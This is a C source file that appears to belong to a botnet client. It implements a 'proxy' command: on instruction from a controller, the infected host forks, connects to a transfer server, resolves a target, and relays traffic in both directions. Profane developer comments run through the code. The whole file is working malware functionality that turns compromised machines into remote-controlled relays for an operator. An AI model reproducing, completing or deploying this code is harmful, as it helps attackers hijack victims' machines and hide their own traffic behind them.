#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <poll.h>
#include <pthread.h>
#include <pty.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#include "bot/client/client.h"
#include "bot/client/commands.h"
#include "bot/definitions.h"
#include "bot/resolver/resolver.h"
#include "bot/utils/bytebuf.h"
#include "bot/utils/xoshiro.h"

enum {
  TYPE_NONE = 0,

  TYPE_IPV4 = 1,
  TYPE_DOMAIN = 2,
};

typedef struct {
  uint32_t ip;
  uint16_t port;
  uint32_t stream;
} proxy_args_t;

ssize_t write_u32(const int sock, const uint32_t val) {
  uint8_t buf[5];
  buf[0] = val >> 24 & 0xFF;
  buf[1] = val >> 16 & 0xFF;
  buf[2] = val >> 8 & 0xFF;
  buf[3] = val & 0xFF;
  return send(sock, buf, 4, MSG_NOSIGNAL);
}

int set_nonblocking(const int sockfd) {
  const int flags = fcntl(sockfd, F_GETFL, 0);
  if (flags == -1) return -1;
  return fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
}

void copy_bidirectional(const int sock1, const int sock2, uint8_t *buffer, size_t buffer_len) {
  fd_set fds;

  const int maxfd = (sock1 > sock2 ? sock1 : sock2) + 1;

  while (1) {
    FD_ZERO(&fds);
    FD_SET(sock1, &fds);
    FD_SET(sock2, &fds);

    const int ret = select(maxfd, &fds, NULL, NULL, NULL);
    if (ret < 0) {
      break;
    }

    if (FD_ISSET(sock1, &fds)) {
      const ssize_t len = read(sock1, buffer, buffer_len);
      if (len <= 0) break;
      if (write(sock2, buffer, len) != len) break;
    }

    if (FD_ISSET(sock2, &fds)) {
      const ssize_t len = read(sock2, buffer, buffer_len);
      if (len <= 0) break;
      if (write(sock1, buffer, len) != len) break;
    }
  }

  close(sock1);
  close(sock2);
}

int socket_connect(uint32_t addr, const unsigned short int port) {
  const int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0) {
    return -1;
  }

  struct sockaddr_in server_addr = {0};
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(port);
  server_addr.sin_addr.s_addr = addr;

  LOG_INFO("Connecting to %s:%d", inet_ntoa(server_addr.sin_addr), port);

  if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
    return -1;
  }

  return sock;
}

bool resolve_domain(uint32_t *out, char *domain) {
  resolver_response_t resp = {0};

  if (resolver_query(domain, &resp, DNS_TYPE_A) != 0) {
    resolver_free(&resp);
    return false;
  }

  // this assumes out is not null, lets hope this won't be a fucking mistake
  *out = resp.records[xoshiro_next() % resp.len].a;
  resolver_free(&resp);

  // yipee!
  return true;
}

void connection(proxy_args_t* arg) {
  uint8_t *buffer = NULL;
  uint8_t *recv_buffer = NULL;

  pbytebuf_t bytebuf = NULL;
  uint32_t addr;

  int tranfer_fd = socket_connect(arg->ip, arg->port);
  if (tranfer_fd <= 0) {
    // perror("");
    LOG_ERROR("Failed to connect to transfer server");
    goto end;
  }

  // send stream id
  if (write_u32(tranfer_fd, htonl(arg->stream)) <= 0) {
    LOG_ERROR("Failed to send stream id");
    goto end;
  }

  // read in len of incomin data
  uint32_t len = 0;
  if (read(tranfer_fd, &len, sizeof(uint32_t)) <= 0) {
    LOG_ERROR("Failed to read data length");
    goto end;
  }

  // convert length, validate it
  len = ntohl(len);
  if (len == 0 || len > 8192) goto end;

  /* oh fucking kill me */
  buffer = malloc(len);
  if (!buffer) goto end;

  ssize_t n = read(tranfer_fd, buffer, len);
  if (n != len) {
    LOG_ERROR("Failed to read buf (%zd/%u bytes)", n, len);
    goto end;
  }

  bytebuf = bytebuf_new_read(buffer, len);
  uint8_t type = bytebuf_read_uint8(bytebuf);
  uint16_t port = bytebuf_read_uint16(bytebuf);
  uint16_t size = bytebuf_read_uint16(bytebuf);
  if (size > 8192) size = 8192;

  // this must be the ugliest code ive written
  if (type == TYPE_DOMAIN) {
    char *domain = bytebuf_read_string(bytebuf, NULL);
    if (!domain || !resolve_domain(&addr, domain)) {
      LOG_ERROR("Failed to resolve domain");
      goto end;
    }
  } else if (type == TYPE_IPV4) {
    addr = htonl(bytebuf_read_uint32(bytebuf));
  } else {
    LOG_ERROR("Unknown address type: %u", type);
    goto end;
  }

  // yeah this will HOPEFULLY work fine LOL
  recv_buffer = malloc(size);
  if (!recv_buffer) goto end;

  const int targ_fd = socket_connect(addr, port);
  if (targ_fd <= 0) goto end;

  // copy stream bidirectional
  copy_bidirectional(tranfer_fd, targ_fd, recv_buffer, size);

end:
  LOG_INFO("Killing thread!");

  if (bytebuf) bytebuf_free(bytebuf, NULL);

  FREE_NULL(recv_buffer);
  FREE_NULL(buffer);

  // I FUCKING HATE PTHREAD FUCK PTHREAD ALL MY HOMIES HATE PTHREAD
  close(tranfer_fd);
  return;
}

void client_cmd_proxy(pclient_t client, pbytebuf_t buffer) {
  UNUSED_PARM(client);

  /* gotta htonl / htons it for little endian devices as it outputs in host order */
  uint32_t stream_id = htonl(bytebuf_read_uint32(buffer));
  uint32_t address = htonl(bytebuf_read_uint32(buffer));
  uint16_t port = bytebuf_read_uint16(buffer);

  // TODO: create the thread,
  proxy_args_t args = {
    .stream = stream_id,
    .port = port,
    .ip = address,
  };

  pid_t pid = fork();
  if (pid < 0) {
    LOG_ERROR("fork failed");
    return;
  }

  if (pid == 0) {
    connection(&args);
    exit(0);
  }
}
